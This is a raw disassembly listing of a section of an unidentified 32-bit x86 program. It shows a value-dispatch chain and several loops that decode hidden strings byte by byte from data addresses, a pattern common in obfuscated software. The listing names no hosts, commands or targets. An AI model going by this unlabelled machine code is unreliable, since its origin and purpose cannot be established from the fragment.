  403784:	8d 44 24 0c          	lea    0xc(%esp),%eax
  403788:	50                   	push   %eax
  403789:	e8 72 a3 00 00       	call   0x40db00
  40378e:	e9 0c 02 00 00       	jmp    0x40399f
  403793:	bb 02 00 00 00       	mov    $0x2,%ebx
  403798:	3b 1c 24             	cmp    (%esp),%ebx
  40379b:	75 29                	jne    0x4037c6
  40379d:	52                   	push   %edx
  40379e:	e8 1d a3 00 00       	call   0x40dac0
  4037a3:	5a                   	pop    %edx
  4037a4:	50                   	push   %eax
  4037a5:	52                   	push   %edx
  4037a6:	e8 15 a3 00 00       	call   0x40dac0
  4037ab:	5a                   	pop    %edx
  4037ac:	50                   	push   %eax
  4037ad:	68 04 00 00 00       	push   $0x4
  4037b2:	e8 c3 6c 00 00       	call   0x40a47a
  4037b7:	8d 44 24 0c          	lea    0xc(%esp),%eax
  4037bb:	50                   	push   %eax
  4037bc:	e8 3f a3 00 00       	call   0x40db00
  4037c1:	e9 d9 01 00 00       	jmp    0x40399f
  4037c6:	bb 03 00 00 00       	mov    $0x3,%ebx
  4037cb:	3b 1c 24             	cmp    (%esp),%ebx
  4037ce:	75 29                	jne    0x4037f9
  4037d0:	52                   	push   %edx
  4037d1:	e8 ea a2 00 00       	call   0x40dac0
  4037d6:	5a                   	pop    %edx
  4037d7:	50                   	push   %eax
  4037d8:	52                   	push   %edx
  4037d9:	e8 e2 a2 00 00       	call   0x40dac0
  4037de:	5a                   	pop    %edx
  4037df:	50                   	push   %eax
  4037e0:	68 00 00 00 00       	push   $0x0
  4037e5:	e8 90 6c 00 00       	call   0x40a47a
  4037ea:	8d 44 24 0c          	lea    0xc(%esp),%eax
  4037ee:	50                   	push   %eax
  4037ef:	e8 0c a3 00 00       	call   0x40db00
  4037f4:	e9 a6 01 00 00       	jmp    0x40399f
  4037f9:	bb 04 00 00 00       	mov    $0x4,%ebx
  4037fe:	3b 1c 24             	cmp    (%esp),%ebx
  403801:	75 29                	jne    0x40382c
  403803:	52                   	push   %edx
  403804:	e8 b7 a2 00 00       	call   0x40dac0
  403809:	5a                   	pop    %edx
  40380a:	50                   	push   %eax
  40380b:	52                   	push   %edx
  40380c:	e8 af a2 00 00       	call   0x40dac0
  403811:	5a                   	pop    %edx
  403812:	50                   	push   %eax
  403813:	68 03 00 00 00       	push   $0x3
  403818:	e8 5d 6c 00 00       	call   0x40a47a
  40381d:	8d 44 24 0c          	lea    0xc(%esp),%eax
  403821:	50                   	push   %eax
  403822:	e8 d9 a2 00 00       	call   0x40db00
  403827:	e9 73 01 00 00       	jmp    0x40399f
  40382c:	bb 05 00 00 00       	mov    $0x5,%ebx
  403831:	3b 1c 24             	cmp    (%esp),%ebx
  403834:	75 29                	jne    0x40385f
  403836:	52                   	push   %edx
  403837:	e8 84 a2 00 00       	call   0x40dac0
  40383c:	5a                   	pop    %edx
  40383d:	50                   	push   %eax
  40383e:	52                   	push   %edx
  40383f:	e8 7c a2 00 00       	call   0x40dac0
  403844:	5a                   	pop    %edx
  403845:	50                   	push   %eax
  403846:	68 08 00 00 00       	push   $0x8
  40384b:	e8 2a 6c 00 00       	call   0x40a47a
  403850:	8d 44 24 0c          	lea    0xc(%esp),%eax
  403854:	50                   	push   %eax
  403855:	e8 a6 a2 00 00       	call   0x40db00
  40385a:	e9 40 01 00 00       	jmp    0x40399f
  40385f:	bb 06 00 00 00       	mov    $0x6,%ebx
  403864:	3b 1c 24             	cmp    (%esp),%ebx
  403867:	75 29                	jne    0x403892
  403869:	52                   	push   %edx
  40386a:	e8 51 a2 00 00       	call   0x40dac0
  40386f:	5a                   	pop    %edx
  403870:	50                   	push   %eax
  403871:	52                   	push   %edx
  403872:	e8 49 a2 00 00       	call   0x40dac0
  403877:	5a                   	pop    %edx
  403878:	50                   	push   %eax
  403879:	68 07 00 00 00       	push   $0x7
  40387e:	e8 f7 6b 00 00       	call   0x40a47a
  403883:	8d 44 24 0c          	lea    0xc(%esp),%eax
  403887:	50                   	push   %eax
  403888:	e8 73 a2 00 00       	call   0x40db00
  40388d:	e9 0d 01 00 00       	jmp    0x40399f
  403892:	bb 07 00 00 00       	mov    $0x7,%ebx
  403897:	3b 1c 24             	cmp    (%esp),%ebx
  40389a:	75 29                	jne    0x4038c5
  40389c:	52                   	push   %edx
  40389d:	e8 1e a2 00 00       	call   0x40dac0
  4038a2:	5a                   	pop    %edx
  4038a3:	50                   	push   %eax
  4038a4:	52                   	push   %edx
  4038a5:	e8 16 a2 00 00       	call   0x40dac0
  4038aa:	5a                   	pop    %edx
  4038ab:	50                   	push   %eax
  4038ac:	68 06 00 00 00       	push   $0x6
  4038b1:	e8 c4 6b 00 00       	call   0x40a47a
  4038b6:	8d 44 24 0c          	lea    0xc(%esp),%eax
  4038ba:	50                   	push   %eax
  4038bb:	e8 40 a2 00 00       	call   0x40db00
  4038c0:	e9 da 00 00 00       	jmp    0x40399f
  4038c5:	bb 08 00 00 00       	mov    $0x8,%ebx
  4038ca:	3b 1c 24             	cmp    (%esp),%ebx
  4038cd:	75 29                	jne    0x4038f8
  4038cf:	52                   	push   %edx
  4038d0:	e8 eb a1 00 00       	call   0x40dac0
  4038d5:	5a                   	pop    %edx
  4038d6:	50                   	push   %eax
  4038d7:	52                   	push   %edx
  4038d8:	e8 e3 a1 00 00       	call   0x40dac0
  4038dd:	5a                   	pop    %edx
  4038de:	50                   	push   %eax
  4038df:	68 02 00 00 00       	push   $0x2
  4038e4:	e8 91 6b 00 00       	call   0x40a47a
  4038e9:	8d 44 24 0c          	lea    0xc(%esp),%eax
  4038ed:	50                   	push   %eax
  4038ee:	e8 0d a2 00 00       	call   0x40db00
  4038f3:	e9 a7 00 00 00       	jmp    0x40399f
  4038f8:	bb 09 00 00 00       	mov    $0x9,%ebx
  4038fd:	3b 1c 24             	cmp    (%esp),%ebx
  403900:	75 26                	jne    0x403928
  403902:	52                   	push   %edx
  403903:	e8 b8 a1 00 00       	call   0x40dac0
  403908:	5a                   	pop    %edx
  403909:	50                   	push   %eax
  40390a:	52                   	push   %edx
  40390b:	e8 b0 a1 00 00       	call   0x40dac0
  403910:	5a                   	pop    %edx
  403911:	50                   	push   %eax
  403912:	68 01 00 00 00       	push   $0x1
  403917:	e8 5e 6b 00 00       	call   0x40a47a
  40391c:	8d 44 24 0c          	lea    0xc(%esp),%eax
  403920:	50                   	push   %eax
  403921:	e8 da a1 00 00       	call   0x40db00
  403926:	eb 77                	jmp    0x40399f
  403928:	bb 0a 00 00 00       	mov    $0xa,%ebx
  40392d:	3b 1c 24             	cmp    (%esp),%ebx
  403930:	75 4e                	jne    0x403980
  403932:	52                   	push   %edx
  403933:	e8 88 a1 00 00       	call   0x40dac0
  403938:	5a                   	pop    %edx
  403939:	50                   	push   %eax
  40393a:	52                   	push   %edx
  40393b:	e8 80 a1 00 00       	call   0x40dac0
  403940:	5a                   	pop    %edx
  403941:	50                   	push   %eax
  403942:	b8 20 60 41 00       	mov    $0x416020,%eax
  403947:	50                   	push   %eax
  403948:	ff 74 24 10          	push   0x10(%esp)
  40394c:	e8 44 56 00 00       	call   0x408f95
  403951:	8d 44 24 0c          	lea    0xc(%esp),%eax
  403955:	50                   	push   %eax
  403956:	e8 a5 a1 00 00       	call   0x40db00
  40395b:	8b 54 24 08          	mov    0x8(%esp),%edx
  40395f:	31 c9                	xor    %ecx,%ecx
  403961:	e8 ba 17 00 00       	call   0x405120
  403966:	75 0c                	jne    0x403974
  403968:	68 01 00 00 00       	push   $0x1
  40396d:	e8 ba 1b 00 00       	call   0x40552c
  403972:	eb 0a                	jmp    0x40397e
  403974:	68 00 00 00 00       	push   $0x0
  403979:	e8 78 e3 ff ff       	call   0x401cf6
  40397e:	eb 1f                	jmp    0x40399f
  403980:	52                   	push   %edx
  403981:	e8 3a a1 00 00       	call   0x40dac0
  403986:	5a                   	pop    %edx
  403987:	50                   	push   %eax
  403988:	52                   	push   %edx
  403989:	e8 32 a1 00 00       	call   0x40dac0
  40398e:	5a                   	pop    %edx
  40398f:	50                   	push   %eax
  403990:	e8 a0 6a 00 00       	call   0x40a435
  403995:	8d 44 24 0c          	lea    0xc(%esp),%eax
  403999:	50                   	push   %eax
  40399a:	e8 61 a1 00 00       	call   0x40db00
  40399f:	58                   	pop    %eax
  4039a0:	8b 54 24 04          	mov    0x4(%esp),%edx
  4039a4:	52                   	push   %edx
  4039a5:	e8 16 a1 00 00       	call   0x40dac0
  4039aa:	5a                   	pop    %edx
  4039ab:	50                   	push   %eax
  4039ac:	52                   	push   %edx
  4039ad:	e8 ae a2 00 00       	call   0x40dc60
  4039b2:	58                   	pop    %eax
  4039b3:	50                   	push   %eax
  4039b4:	e8 b7 17 00 00       	call   0x405170
  4039b9:	5a                   	pop    %edx
  4039ba:	01 d0                	add    %edx,%eax
  4039bc:	eb 0a                	jmp    0x4039c8
  4039be:	e8 2d a3 00 00       	call   0x40dcf0
  4039c3:	66 c7 00 00 00       	movw   $0x0,(%eax)
  4039c8:	ff 74 24 04          	push   0x4(%esp)
  4039cc:	e8 bf a1 00 00       	call   0x40db90
  4039d1:	ff 34 24             	push   (%esp)
  4039d4:	e8 b7 a1 00 00       	call   0x40db90
  4039d9:	83 c4 08             	add    $0x8,%esp
  4039dc:	5b                   	pop    %ebx
  4039dd:	c2 08 00             	ret    $0x8
  4039e0:	55                   	push   %ebp
  4039e1:	53                   	push   %ebx
  4039e2:	31 c0                	xor    %eax,%eax
  4039e4:	50                   	push   %eax
  4039e5:	e8 16 a2 00 00       	call   0x40dc00
  4039ea:	8b 54 24 10          	mov    0x10(%esp),%edx
  4039ee:	8d 0c 24             	lea    (%esp),%ecx
  4039f1:	e8 6a 16 00 00       	call   0x405060
  4039f6:	ff 34 24             	push   (%esp)
  4039f9:	ff 35 90 70 41 00    	push   0x417090
  4039ff:	e8 e9 60 00 00       	call   0x409aed
  403a04:	89 c5                	mov    %eax,%ebp
  403a06:	8b 5d 00             	mov    0x0(%ebp),%ebx
  403a09:	83 fb 01             	cmp    $0x1,%ebx
  403a0c:	7d 59                	jge    0x403a67
  403a0e:	ff 34 24             	push   (%esp)
  403a11:	ff 35 90 70 41 00    	push   0x417090
  403a17:	e8 d1 60 00 00       	call   0x409aed
  403a1c:	89 c5                	mov    %eax,%ebp
  403a1e:	c7 45 00 01 00 00 00 	movl   $0x1,0x0(%ebp)
  403a25:	ff 35 78 70 41 00    	push   0x417078
  403a2b:	e8 04 67 00 00       	call   0x40a134
  403a30:	8b 14 24             	mov    (%esp),%edx
  403a33:	52                   	push   %edx
  403a34:	e8 87 a0 00 00       	call   0x40dac0
  403a39:	5a                   	pop    %edx
  403a3a:	50                   	push   %eax
  403a3b:	52                   	push   %edx
  403a3c:	e8 1f a2 00 00       	call   0x40dc60
  403a41:	8b 2d 7c 70 41 00    	mov    0x41707c,%ebp
  403a47:	8d 45 0c             	lea    0xc(%ebp),%eax
  403a4a:	50                   	push   %eax
  403a4b:	e8 b0 a0 00 00       	call   0x40db00
  403a50:	ff 35 64 70 41 00    	push   0x417064
  403a56:	58                   	pop    %eax
  403a57:	89 45 08             	mov    %eax,0x8(%ebp)
  403a5a:	8b 1d 64 70 41 00    	mov    0x417064,%ebx
  403a60:	43                   	inc    %ebx
  403a61:	89 1d 64 70 41 00    	mov    %ebx,0x417064
  403a67:	31 c0                	xor    %eax,%eax
  403a69:	ff 34 24             	push   (%esp)
  403a6c:	e8 1f a1 00 00       	call   0x40db90
  403a71:	83 c4 04             	add    $0x4,%esp
  403a74:	5b                   	pop    %ebx
  403a75:	5d                   	pop    %ebp
  403a76:	c2 04 00             	ret    $0x4
  403a79:	53                   	push   %ebx
  403a7a:	ba 0e 00 00 00       	mov    $0xe,%edx
  403a7f:	83 ec 04             	sub    $0x4,%esp
  403a82:	c7 04 24 00 00 00 00 	movl   $0x0,(%esp)
  403a89:	4a                   	dec    %edx
  403a8a:	75 f3                	jne    0x403a7f
  403a8c:	e8 6f a1 00 00       	call   0x40dc00
  403a91:	b8 8d 60 41 00       	mov    $0x41608d,%eax
  403a96:	a3 0c 70 41 00       	mov    %eax,0x41700c
  403a9b:	c7 04 24 00 00 00 00 	movl   $0x0,(%esp)
  403aa2:	eb 00                	jmp    0x403aa4
  403aa4:	b8 19 00 00 00       	mov    $0x19,%eax
  403aa9:	3b 04 24             	cmp    (%esp),%eax
  403aac:	7c 64                	jl     0x403b12
  403aae:	a1 0c 70 41 00       	mov    0x41700c,%eax
  403ab3:	0f be 00             	movsbl (%eax),%eax
  403ab6:	89 44 24 04          	mov    %eax,0x4(%esp)
  403aba:	ff 05 0c 70 41 00    	incl   0x41700c
  403ac0:	52                   	push   %edx
  403ac1:	e8 fa 9f 00 00       	call   0x40dac0
  403ac6:	5a                   	pop    %edx
  403ac7:	50                   	push   %eax
  403ac8:	52                   	push   %edx
  403ac9:	e8 f2 9f 00 00       	call   0x40dac0
  403ace:	5a                   	pop    %edx
  403acf:	50                   	push   %eax
  403ad0:	8b 5c 24 0c          	mov    0xc(%esp),%ebx
  403ad4:	6b db ff             	imul   $0xffffffff,%ebx,%ebx
  403ad7:	53                   	push   %ebx
  403ad8:	e8 33 24 00 00       	call   0x405f10
  403add:	8d 44 24 0c          	lea    0xc(%esp),%eax
  403ae1:	50                   	push   %eax
  403ae2:	e8 19 a0 00 00       	call   0x40db00
  403ae7:	8b 54 24 0c          	mov    0xc(%esp),%edx
  403aeb:	52                   	push   %edx
  403aec:	e8 cf 9f 00 00       	call   0x40dac0
  403af1:	5a                   	pop    %edx
  403af2:	50                   	push   %eax
  403af3:	52                   	push   %edx
  403af4:	e8 67 a1 00 00       	call   0x40dc60
  403af9:	8b 54 24 0c          	mov    0xc(%esp),%edx
  403afd:	52                   	push   %edx
  403afe:	e8 5d a1 00 00       	call   0x40dc60
  403b03:	8d 44 24 10          	lea    0x10(%esp),%eax
  403b07:	50                   	push   %eax
  403b08:	e8 f3 9f 00 00       	call   0x40db00
  403b0d:	ff 04 24             	incl   (%esp)
  403b10:	71 92                	jno    0x403aa4
  403b12:	b8 f1 60 41 00       	mov    $0x4160f1,%eax
  403b17:	a3 0c 70 41 00       	mov    %eax,0x41700c
  403b1c:	c7 04 24 00 00 00 00 	movl   $0x0,(%esp)
  403b23:	eb 00                	jmp    0x403b25
  403b25:	b8 06 00 00 00       	mov    $0x6,%eax
  403b2a:	3b 04 24             	cmp    (%esp),%eax
  403b2d:	7c 64                	jl     0x403b93
  403b2f:	a1 0c 70 41 00       	mov    0x41700c,%eax
  403b34:	0f be 00             	movsbl (%eax),%eax
  403b37:	89 44 24 04          	mov    %eax,0x4(%esp)
  403b3b:	ff 05 0c 70 41 00    	incl   0x41700c
  403b41:	52                   	push   %edx
  403b42:	e8 79 9f 00 00       	call   0x40dac0
  403b47:	5a                   	pop    %edx
  403b48:	50                   	push   %eax
  403b49:	52                   	push   %edx
  403b4a:	e8 71 9f 00 00       	call   0x40dac0
  403b4f:	5a                   	pop    %edx
  403b50:	50                   	push   %eax
  403b51:	8b 5c 24 0c          	mov    0xc(%esp),%ebx
  403b55:	6b db ff             	imul   $0xffffffff,%ebx,%ebx
  403b58:	53                   	push   %ebx
  403b59:	e8 b2 23 00 00       	call   0x405f10
  403b5e:	8d 44 24 0c          	lea    0xc(%esp),%eax
  403b62:	50                   	push   %eax
  403b63:	e8 98 9f 00 00       	call   0x40db00
  403b68:	8b 54 24 10          	mov    0x10(%esp),%edx
  403b6c:	52                   	push   %edx
  403b6d:	e8 4e 9f 00 00       	call   0x40dac0
  403b72:	5a                   	pop    %edx
  403b73:	50                   	push   %eax
  403b74:	52                   	push   %edx
  403b75:	e8 e6 a0 00 00       	call   0x40dc60
  403b7a:	8b 54 24 0c          	mov    0xc(%esp),%edx
  403b7e:	52                   	push   %edx
  403b7f:	e8 dc a0 00 00       	call   0x40dc60
  403b84:	8d 44 24 14          	lea    0x14(%esp),%eax
  403b88:	50                   	push   %eax
  403b89:	e8 72 9f 00 00       	call   0x40db00
  403b8e:	ff 04 24             	incl   (%esp)
  403b91:	71 92                	jno    0x403b25
  403b93:	b8 00 61 41 00       	mov    $0x416100,%eax
  403b98:	a3 0c 70 41 00       	mov    %eax,0x41700c
  403b9d:	c7 04 24 00 00 00 00 	movl   $0x0,(%esp)
  403ba4:	eb 00                	jmp    0x403ba6
  403ba6:	b8 03 00 00 00       	mov    $0x3,%eax
  403bab:	3b 04 24             	cmp    (%esp),%eax
  403bae:	7c 64                	jl     0x403c14
  403bb0:	a1 0c 70 41 00       	mov    0x41700c,%eax
  403bb5:	0f be 00             	movsbl (%eax),%eax
  403bb8:	89 44 24 04          	mov    %eax,0x4(%esp)
  403bbc:	ff 05 0c 70 41 00    	incl   0x41700c
  403bc2:	52                   	push   %edx
  403bc3:	e8 f8 9e 00 00       	call   0x40dac0
  403bc8:	5a                   	pop    %edx
  403bc9:	50                   	push   %eax
  403bca:	52                   	push   %edx
  403bcb:	e8 f0 9e 00 00       	call   0x40dac0
  403bd0:	5a                   	pop    %edx
  403bd1:	50                   	push   %eax
  403bd2:	8b 5c 24 0c          	mov    0xc(%esp),%ebx
  403bd6:	6b db ff             	imul   $0xffffffff,%ebx,%ebx
  403bd9:	53                   	push   %ebx
  403bda:	e8 31 23 00 00       	call   0x405f10
  403bdf:	8d 44 24 0c          	lea    0xc(%esp),%eax
  403be3:	50                   	push   %eax
  403be4:	e8 17 9f 00 00       	call   0x40db00
  403be9:	8b 54 24 14          	mov    0x14(%esp),%edx
  403bed:	52                   	push   %edx
  403bee:	e8 cd 9e 00 00       	call   0x40dac0
  403bf3:	5a                   	pop    %edx
  403bf4:	50                   	push   %eax
  403bf5:	52                   	push   %edx
  403bf6:	e8 65 a0 00 00       	call   0x40dc60
  403bfb:	8b 54 24 0c          	mov    0xc(%esp),%edx
  403bff:	52                   	push   %edx
  403c00:	e8 5b a0 00 00       	call   0x40dc60
  403c05:	8d 44 24 18          	lea    0x18(%esp),%eax
  403c09:	50                   	push   %eax
  403c0a:	e8 f1 9e 00 00       	call   0x40db00
  403c0f:	ff 04 24             	incl   (%esp)
  403c12:	71 92                	jno    0x403ba6
  403c14:	b8 f8 60 41 00       	mov    $0x4160f8,%eax
  403c19:	a3 0c 70 41 00       	mov    %eax,0x41700c
  403c1e:	c7 04 24 00 00 00 00 	movl   $0x0,(%esp)
  403c25:	eb 00                	jmp    0x403c27
  403c27:	b8 07 00 00 00       	mov    $0x7,%eax
  403c2c:	3b 04 24             	cmp    (%esp),%eax
  403c2f:	7c 64                	jl     0x403c95
  403c31:	a1 0c 70 41 00       	mov    0x41700c,%eax
  403c36:	0f be 00             	movsbl (%eax),%eax
  403c39:	89 44 24 04          	mov    %eax,0x4(%esp)
  403c3d:	ff 05 0c 70 41 00    	incl   0x41700c
  403c43:	52                   	push   %edx
  403c44:	e8 77 9e 00 00       	call   0x40dac0
  403c49:	5a                   	pop    %edx
  403c4a:	50                   	push   %eax
  403c4b:	52                   	push   %edx
  403c4c:	e8 6f 9e 00 00       	call   0x40dac0
  403c51:	5a                   	pop    %edx
  403c52:	50                   	push   %eax
  403c53:	8b 5c 24 0c          	mov    0xc(%esp),%ebx
  403c57:	6b db ff             	imul   $0xffffffff,%ebx,%ebx
  403c5a:	53                   	push   %ebx
  403c5b:	e8 b0 22 00 00       	call   0x405f10
  403c60:	8d 44 24 0c          	lea    0xc(%esp),%eax
  403c64:	50                   	push   %eax
  403c65:	e8 96 9e 00 00       	call   0x40db00
  403c6a:	8b 54 24 18          	mov    0x18(%esp),%edx
  403c6e:	52                   	push   %edx
  403c6f:	e8 4c 9e 00 00       	call   0x40dac0
  403c74:	5a                   	pop    %edx
  403c75:	50                   	push   %eax
  403c76:	52                   	push   %edx
  403c77:	e8 e4 9f 00 00       	call   0x40dc60
  403c7c:	8b 54 24 0c          	mov    0xc(%esp),%edx
  403c80:	52                   	push   %edx
  403c81:	e8 da 9f 00 00       	call   0x40dc60
  403c86:	8d 44 24 1c          	lea    0x1c(%esp),%eax
  403c8a:	50                   	push   %eax
  403c8b:	e8 70 9e 00 00       	call   0x40db00
  403c90:	ff 04 24             	incl   (%esp)
  403c93:	71 92                	jno    0x403c27
  403c95:	b8 ca 60 41 00       	mov    $0x4160ca,%eax
  403c9a:	a3 0c 70 41 00       	mov    %eax,0x41700c
  403c9f:	c7 04 24 00 00 00 00 	movl   $0x0,(%esp)
  403ca6:	eb 00                	jmp    0x403ca8
  403ca8:	b8 0d 00 00 00       	mov    $0xd,%eax
  403cad:	3b 04 24             	cmp    (%esp),%eax
  403cb0:	7c 64                	jl     0x403d16
  403cb2:	a1 0c 70 41 00       	mov    0x41700c,%eax
  403cb7:	0f be 00             	movsbl (%eax),%eax
  403cba:	89 44 24 04          	mov    %eax,0x4(%esp)
  403cbe:	ff 05 0c 70 41 00    	incl   0x41700c
  403cc4:	52                   	push   %edx
  403cc5:	e8 f6 9d 00 00       	call   0x40dac0
  403cca:	5a                   	pop    %edx
  403ccb:	50                   	push   %eax
  403ccc:	52                   	push   %edx
  403ccd:	e8 ee 9d 00 00       	call   0x40dac0
  403cd2:	5a                   	pop    %edx
  403cd3:	50                   	push   %eax
  403cd4:	8b 5c 24 0c          	mov    0xc(%esp),%ebx
  403cd8:	6b db ff             	imul   $0xffffffff,%ebx,%ebx
  403cdb:	53                   	push   %ebx
  403cdc:	e8 2f 22 00 00       	call   0x405f10
  403ce1:	8d 44 24 0c          	lea    0xc(%esp),%eax
  403ce5:	50                   	push   %eax
  403ce6:	e8 15 9e 00 00       	call   0x40db00
  403ceb:	8b 54 24 1c          	mov    0x1c(%esp),%edx
  403cef:	52                   	push   %edx
  403cf0:	e8 cb 9d 00 00       	call   0x40dac0
  403cf5:	5a                   	pop    %edx
  403cf6:	50                   	push   %eax
  403cf7:	52                   	push   %edx
  403cf8:	e8 63 9f 00 00       	call   0x40dc60
  403cfd:	8b 54 24 0c          	mov    0xc(%esp),%edx
  403d01:	52                   	push   %edx
  403d02:	e8 59 9f 00 00       	call   0x40dc60
  403d07:	8d 44 24 20          	lea    0x20(%esp),%eax
  403d0b:	50                   	push   %eax
  403d0c:	e8 ef 9d 00 00       	call   0x40db00
  403d11:	ff 04 24             	incl   (%esp)
  403d14:	71 92                	jno    0x403ca8
  403d16:	b8 d8 60 41 00       	mov    $0x4160d8,%eax
  403d1b:	a3 0c 70 41 00       	mov    %eax,0x41700c
  403d20:	c7 04 24 00 00 00 00 	movl   $0x0,(%esp)
  403d27:	eb 00                	jmp    0x403d29
  403d29:	b8 0e 00 00 00       	mov    $0xe,%eax
  403d2e:	3b 04 24             	cmp    (%esp),%eax
  403d31:	7c 68                	jl     0x403d9b
  403d33:	a1 0c 70 41 00       	mov    0x41700c,%eax
  403d38:	0f be 00             	movsbl (%eax),%eax
  403d3b:	89 44 24 04          	mov    %eax,0x4(%esp)
  403d3f:	ff 05 0c 70 41 00    	incl   0x41700c
  403d45:	52                   	push   %edx
  403d46:	e8 75 9d 00 00       	call   0x40dac0
  403d4b:	5a                   	pop    %edx
  403d4c:	50                   	push   %eax
  403d4d:	52                   	push   %edx
  403d4e:	e8 6d 9d 00 00       	call   0x40dac0
  403d53:	5a                   	pop    %edx
  403d54:	50                   	push   %eax
  403d55:	8b 5c 24 0c          	mov    0xc(%esp),%ebx
  403d59:	6b db ff             	imul   $0xffffffff,%ebx,%ebx
  403d5c:	53                   	push   %ebx
  403d5d:	e8 ae 21 00 00       	call   0x405f10
  403d62:	8d 44 24 0c          	lea    0xc(%esp),%eax
  403d66:	50                   	push   %eax
  403d67:	e8 94 9d 00 00       	call   0x40db00
  403d6c:	8b 15 10 70 41 00    	mov    0x417010,%edx
  403d72:	52                   	push   %edx
  403d73:	e8 48 9d 00 00       	call   0x40dac0
  403d78:	5a                   	pop    %edx
  403d79:	50                   	push   %eax
  403d7a:	52                   	push   %edx
  403d7b:	e8 e0 9e 00 00       	call   0x40dc60
  403d80:	8b 54 24 0c          	mov    0xc(%esp),%edx
  403d84:	52                   	push   %edx
  403d85:	e8 d6 9e 00 00       	call   0x40dc60
  403d8a:	8d 05 10 70 41 00    	lea    0x417010,%eax
  403d90:	50                   	push   %eax
  403d91:	e8 6a 9d 00 00       	call   0x40db00
  403d96:	ff 04 24             	incl   (%esp)
  403d99:	71 8e                	jno    0x403d29
  403d9b:	b8 e7 60 41 00       	mov    $0x4160e7,%eax
  403da0:	a3 0c 70 41 00       	mov    %eax,0x41700c
  403da5:	c7 04 24 00 00 00 00 	movl   $0x0,(%esp)
  403dac:	eb 00                	jmp    0x403dae
  403dae:	b8 09 00 00 00       	mov    $0x9,%eax
  403db3:	3b 04 24             	cmp    (%esp),%eax
  403db6:	7c 68                	jl     0x403e20
  403db8:	a1 0c 70 41 00       	mov    0x41700c,%eax
  403dbd:	0f be 00             	movsbl (%eax),%eax
  403dc0:	89 44 24 04          	mov    %eax,0x4(%esp)
  403dc4:	ff 05 0c 70 41 00    	incl   0x41700c
  403dca:	52                   	push   %edx
  403dcb:	e8 f0 9c 00 00       	call   0x40dac0
  403dd0:	5a                   	pop    %edx
  403dd1:	50                   	push   %eax
  403dd2:	52                   	push   %edx
  403dd3:	e8 e8 9c 00 00       	call   0x40dac0
  403dd8:	5a                   	pop    %edx
  403dd9:	50                   	push   %eax
  403dda:	8b 5c 24 0c          	mov    0xc(%esp),%ebx
  403dde:	6b db ff             	imul   $0xffffffff,%ebx,%ebx
  403de1:	53                   	push   %ebx
  403de2:	e8 29 21 00 00       	call   0x405f10
  403de7:	8d 44 24 0c          	lea    0xc(%esp),%eax
  403deb:	50                   	push   %eax
  403dec:	e8 0f 9d 00 00       	call   0x40db00
  403df1:	8b 15 5c 70 41 00    	mov    0x41705c,%edx
  403df7:	52                   	push   %edx
  403df8:	e8 c3 9c 00 00       	call   0x40dac0
  403dfd:	5a                   	pop    %edx
  403dfe:	50                   	push   %eax
  403dff:	52                   	push   %edx
  403e00:	e8 5b 9e 00 00       	call   0x40dc60
  403e05:	8b 54 24 0c          	mov    0xc(%esp),%edx
  403e09:	52                   	push   %edx
  403e0a:	e8 51 9e 00 00       	call   0x40dc60
  403e0f:	8d 05 5c 70 41 00    	lea    0x41705c,%eax
  403e15:	50                   	push   %eax
  403e16:	e8 e5 9c 00 00       	call   0x40db00
  403e1b:	ff 04 24             	incl   (%esp)
  403e1e:	71 8e                	jno    0x403dae
  403e20:	b8 88 60 41 00       	mov    $0x416088,%eax
  403e25:	a3 0c 70 41 00       	mov    %eax,0x41700c
  403e2a:	c7 04 24 00 00 00 00 	movl   $0x0,(%esp)
  403e31:	eb 00                	jmp    0x403e33
  403e33:	b8 04 00 00 00       	mov    $0x4,%eax
  403e38:	3b 04 24             	cmp    (%esp),%eax
  403e3b:	7c 68                	jl     0x403ea5
  403e3d:	a1 0c 70 41 00       	mov    0x41700c,%eax
  403e42:	0f be 00             	movsbl (%eax),%eax
  403e45:	89 44 24 04          	mov    %eax,0x4(%esp)
  403e49:	ff 05 0c 70 41 00    	incl   0x41700c
  403e4f:	52                   	push   %edx
  403e50:	e8 6b 9c 00 00       	call   0x40dac0
  403e55:	5a                   	pop    %edx
  403e56:	50                   	push   %eax
  403e57:	52                   	push   %edx
  403e58:	e8 63 9c 00 00       	call   0x40dac0
  403e5d:	5a                   	pop    %edx
  403e5e:	50                   	push   %eax
  403e5f:	8b 5c 24 0c          	mov    0xc(%esp),%ebx
  403e63:	6b db ff             	imul   $0xffffffff,%ebx,%ebx
  403e66:	53                   	push   %ebx
  403e67:	e8 a4 20 00 00       	call   0x405f10
  403e6c:	8d 44 24 0c          	lea    0xc(%esp),%eax
  403e70:	50                   	push   %eax
  403e71:	e8 8a 9c 00 00       	call   0x40db00
  403e76:	8b 15 34 70 41 00    	mov    0x417034,%edx
  403e7c:	52                   	push   %edx
  403e7d:	e8 3e 9c 00 00       	call   0x40dac0
  403e82:	5a                   	pop    %edx
  403e83:	50                   	push   %eax
  403e84:	52                   	push   %edx
  403e85:	e8 d6 9d 00 00       	call   0x40dc60
  403e8a:	8b 54 24 0c          	mov    0xc(%esp),%edx
  403e8e:	52                   	push   %edx
  403e8f:	e8 cc 9d 00 00       	call   0x40dc60
  403e94:	8d 05 34 70 41 00    	lea    0x417034,%eax
  403e9a:	50                   	push   %eax
  403e9b:	e8 60 9c 00 00       	call   0x40db00
  403ea0:	ff 04 24             	incl   (%esp)
  403ea3:	71 8e                	jno    0x403e33
  403ea5:	52                   	push   %edx
  403ea6:	e8 15 9c 00 00       	call   0x40dac0
  403eab:	5a                   	pop    %edx
  403eac:	50                   	push   %eax
  403ead:	ff 74 24 18          	push   0x18(%esp)
  403eb1:	ff 74 24 18          	push   0x18(%esp)
  403eb5:	e8 46 f5 ff ff       	call   0x403400
  403eba:	8d 44 24 24          	lea    0x24(%esp),%eax
  403ebe:	50                   	push   %eax
  403ebf:	e8 3c 9c 00 00       	call   0x40db00
  403ec4:	e8 d5 55 00 00       	call   0x40949e
  403ec9:	89 44 24 24          	mov    %eax,0x24(%esp)
  403ecd:	68 00 00 00 00       	push   $0x0
  403ed2:	e8 9f 11 00 00       	call   0x405076
  403ed7:	a3 28 70 41 00       	mov    %eax,0x417028
  403edc:	52                   	push   %edx
  403edd:	e8 de 9b 00 00       	call   0x40dac0
  403ee2:	5a                   	pop    %edx
  403ee3:	50                   	push   %eax
  403ee4:	52                   	push   %edx
  403ee5:	e8 d6 9b 00 00       	call   0x40dac0
  403eea:	5a                   	pop    %edx
  403eeb:	50                   	push   %eax
  403eec:	52                   	push   %edx
  403eed:	e8 ce 9b 00 00       	call   0x40dac0
  403ef2:	5a                   	pop    %edx
  403ef3:	50                   	push   %eax
  403ef4:	52                   	push   %edx
  403ef5:	e8 c6 9b 00 00       	call   0x40dac0
